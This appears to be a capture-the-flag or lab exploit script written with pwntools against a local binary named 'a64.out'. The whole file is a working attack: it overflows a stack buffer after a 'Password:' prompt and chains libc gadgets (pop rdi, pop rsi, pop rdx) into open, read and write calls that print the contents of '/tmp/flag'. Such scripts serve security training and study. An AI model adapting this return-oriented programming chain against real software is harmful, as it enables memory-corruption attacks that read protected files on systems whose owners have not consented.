from pwn import *
io = process('./a64.out')

elf = ELF('./a64.out')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# libc"s base_addr
base_addr = 0x7ffff7dcb000	
# func : rdi-rsi-rdx-rcx-r8-r9
poprdi_ret = base_addr + 0x27725
poprsi_ret = base_addr + 0x28ed9
poprdx_ret = base_addr + 0xfdd4d
# # write the flag to the writable_addr
writable_addr = 0x404700
# string_addr = "/tmp/flag"s
string_addr = 0x7fffffffde00
# fileName
fileName = b'/tmp/flag\0' 
payload = fileName + cyclic(72 - len(fileName))
# open the /tmp/flag
# open("/tmp/flag", 0)
# rdi = string_addr rsi = 0
payload += p64(poprdi_ret)
payload += p64(string_addr)
payload += p64(poprsi_ret)
payload += p64(0)
payload += p64(base_addr + libc.symbols['open'])
# read the flag
# read(3, writable_addr, 10)
# rdi = 3 rsi = writable_addr rdx = 10
payload += p64(poprdi_ret)
payload += p64(3)
payload += p64(poprsi_ret)
payload += p64(writable_addr)
payload += p64(poprdx_ret)
payload += p64(10)
payload += p64(base_addr + libc.symbols['read'])
# write the flag
# write(1, writable_addr, 10)
# rdi = 1 rsi = writable_addr rdx = 10
payload += p64(poprdi_ret)
payload += p64(1)
payload += p64(poprsi_ret)
payload += p64(writable_addr)
payload += p64(poprdx_ret)
payload += p64(10)
payload += p64(base_addr + libc.symbols['write'])

# gdb.attach(io, "b *(start+146)") # we can raise a debug interface here
io.sendafter(b'Password:', payload)
io.interactive()


